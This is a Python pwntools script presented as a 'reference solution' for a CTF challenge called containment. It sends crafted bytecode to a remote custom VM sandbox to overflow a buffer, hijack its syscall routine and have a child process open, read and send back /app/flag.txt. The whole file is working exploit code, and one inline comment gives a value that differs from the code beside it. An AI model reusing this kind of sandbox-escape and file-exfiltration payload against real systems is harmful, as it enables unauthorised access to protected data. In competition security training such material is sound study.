
# Reference solution for containment.

from pwn import *
import struct

import time

# ------------
# p = process(['./breach', 'breach.bin'])
p = remote('mc.ax', 31618)
# ------------

# Stage 1
code = b'a' * 40
code += struct.pack('<B', 1 | (8 << 4)) + struct.pack('<Q', 0) # li r6, 0
code += struct.pack('<B', 2) + struct.pack('<B', 9 + (8 << 4)) # mov r7, r6
code += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', 0x2020) # li t0, 0x2020
code += struct.pack('<B', 5) + struct.pack('<B', 0 + (10 << 4)) # ld t0, r8
code += struct.pack('<B', 1 | (11 << 4)) + struct.pack('<Q', 0x800) # li r9, 0x700
code += struct.pack('<B', 7) + struct.pack('<Q', 9043) # jmp do_syscall

code += b'a' * (0x60 - len(code))

p.send(code)

time.sleep(1)

p.sendline(b'')

time.sleep(1)


# running inside child process

# fd = open("/flag.txt")
# read(fd, buf, 0x20)
# write(sock, buf, 0x20)

cret_1 = 1292
cret_2 = 1354
flag_offset = 1403

child = b''
child += b'a' * 1212

child += struct.pack('<B', 1 | (8 << 4)) + struct.pack('<Q', 2) # li r6, 2 (open)

child += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', 0x2020) # li t0, 0x2020
child += struct.pack('<B', 5) + struct.pack('<B', 0 + (9 << 4)) # ld t0, r7
child += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', flag_offset) # li t0, flag_offset
child += struct.pack('<B', 3 + (0 << 4)) + struct.pack('<B', 9 + (0 << 4)) # add r7, t0

child += struct.pack('<B', 1 | (10 << 4)) + struct.pack('<Q', 0) # li r8, 0

child += struct.pack('<B', 1 | (11 << 4)) + struct.pack('<Q', 0) # li r9, 0

child += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', 16) # li t0, 16
child += struct.pack('<B', 3 + (1 << 4)) + struct.pack('<B', 15 + (0 << 4)) # sub sp, t0
child += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', cret_1) # li t0, cret_1
child += struct.pack('<B', 4) + struct.pack('<B', 15 + (0 << 4)) # st sp, t0
child += struct.pack('<B', 7) + struct.pack('<Q', 9043) # jmp do_syscall

print('cret_1 = ', len(child))

child += struct.pack('<B', 2) + struct.pack('<B', 9 + (8 << 4)) # mov r7, r6 (fd)
child += struct.pack('<B', 1 | (8 << 4)) + struct.pack('<Q', 0) # li r6, 0 (read)
child += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', 0x2020) # li t0, 0x2020
child += struct.pack('<B', 5) + struct.pack('<B', 0 + (10 << 4)) # ld t0, r8
child += struct.pack('<B', 1 | (11 << 4)) + struct.pack('<Q', 0x30) # li r9, 0x30
child += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', 16) # li t0, 16
child += struct.pack('<B', 3 + (1 << 4)) + struct.pack('<B', 15 + (0 << 4)) # sub sp, t0
child += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', cret_2) # li t0, cret_2
child += struct.pack('<B', 4) + struct.pack('<B', 15 + (0 << 4)) # st sp, t0
child += struct.pack('<B', 7) + struct.pack('<Q', 9043) # jmp do_syscall

print('cret_2 = ', len(child))

child += struct.pack('<B', 1 | (8 << 4)) + struct.pack('<Q', 1) # li r6, 1 (write)
child += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', 0x2010) # li t0, 0x2010
child += struct.pack('<B', 5) + struct.pack('<B', 0 + (9 << 4)) # ld t0, r7
child += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', 0x2020) # li t0, 0x2020
child += struct.pack('<B', 5) + struct.pack('<B', 0 + (10 << 4)) # ld t0, r8
child += struct.pack('<B', 1 | (11 << 4)) + struct.pack('<Q', 0x30) # li r9, 0x30
child += struct.pack('<B', 7) + struct.pack('<Q', 9043) # jmp do_syscall

print('flag_offset = ', len(child))

child += b'/app/flag.txt\x00'

print('child_size = ', len(child))

child_size = 1417

# Running in parent

# li t1, 0x2028
# st t1, r6

# ; write(tx, &read_size, 8);
# li r6, 1 ; SYS_write
# li t0, 0x2010
# ld t0, r7
# mov r8, r1
# addi r8, 0x6088
# li r9, 0x8
# call do_syscall

# ; write(tx, &rom, read_size);
# li r6, 1 ; SYS_write
# li t0, 0x2010
# ld t0, r7
# li t0, 0x2020
# ld t0, r8 ; rom
# li t1, 0x2028
# ld t1, r9
# call do_syscall

pret_1 = 90
pret_2 = 161
pret_3 = 230

pcode_offset = 230

code2 = b''
code2 += b'a' * 8 # pad

code2 += struct.pack('<B', 1 | (8 << 4)) + struct.pack('<Q', 1) # li r6, 1 (write)

code2 += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', 0x2010) # li t0, 0x2010
code2 += struct.pack('<B', 5) + struct.pack('<B', 0 + (9 << 4)) # ld t0, r7

code2 += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', 0x2020) # li t0, 0x2020
code2 += struct.pack('<B', 5) + struct.pack('<B', 0 + (10 << 4)) # ld t0, r8
code2 += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', pcode_offset) # li t0, pcode_offset
code2 += struct.pack('<B', 3 + (0 << 4)) + struct.pack('<B', 10 + (0 << 4)) # add r8, t0

code2 += struct.pack('<B', 1 | (11 << 4)) + struct.pack('<Q', child_size + 8) # li r9, code_size + 8

code2 += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', 16) # li t0, 16
code2 += struct.pack('<B', 3 + (1 << 4)) + struct.pack('<B', 15 + (0 << 4)) # sub sp, t0
code2 += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', pret_1) # li t0, pret_1
code2 += struct.pack('<B', 4) + struct.pack('<B', 15 + (0 << 4)) # st sp, t0
code2 += struct.pack('<B', 7) + struct.pack('<Q', 9043) # jmp do_syscall

print('pret_1 = ', len(code2))

# Read flag back:
code2 += struct.pack('<B', 1 | (8 << 4)) + struct.pack('<Q', 0) # li r6, 0 (read)

code2 += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', 0x2018) # li t0, 0x2018
code2 += struct.pack('<B', 5) + struct.pack('<B', 0 + (9 << 4)) # ld t0, r7

code2 += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', 0x2020) # li t0, 0x2020
code2 += struct.pack('<B', 5) + struct.pack('<B', 0 + (10 << 4)) # ld t0, r8

code2 += struct.pack('<B', 1 | (11 << 4)) + struct.pack('<Q', 0x40) # li r9, 0x40

code2 += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', 16) # li t0, 16
code2 += struct.pack('<B', 3 + (1 << 4)) + struct.pack('<B', 15 + (0 << 4)) # sub sp, t0
code2 += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', pret_2) # li t0, pret_2
code2 += struct.pack('<B', 4) + struct.pack('<B', 15 + (0 << 4)) # st sp, t0
code2 += struct.pack('<B', 7) + struct.pack('<Q', 9043) # jmp do_syscall

print('pret_2 = ', len(code2))

# Print flag:
code2 += struct.pack('<B', 1 | (8 << 4)) + struct.pack('<Q', 1) # li r6, 1 (write)

code2 += struct.pack('<B', 1 | (9 << 4)) + struct.pack('<Q', 1) # li r7, 1

code2 += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', 0x2020) # li t0, 0x2020
code2 += struct.pack('<B', 5) + struct.pack('<B', 0 + (10 << 4)) # ld t0, r8

code2 += struct.pack('<B', 1 | (11 << 4)) + struct.pack('<Q', 0x40) # li r9, 0x40

code2 += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', 16) # li t0, 16
code2 += struct.pack('<B', 3 + (1 << 4)) + struct.pack('<B', 15 + (0 << 4)) # sub sp, t0
code2 += struct.pack('<B', 1 | (0 << 4)) + struct.pack('<Q', pret_3) # li t0, pret_3
code2 += struct.pack('<B', 4) + struct.pack('<B', 15 + (0 << 4)) # st sp, t0
code2 += struct.pack('<B', 7) + struct.pack('<Q', 9043) # jmp do_syscall

print('pret_3 = ', len(code2))

print('pcode_offset = ', len(code2))

code2 += struct.pack('<Q', child_size)
code2 += child

print('code2 size: ', hex(len(code2)))

p.sendline(code2)

p.interactive()
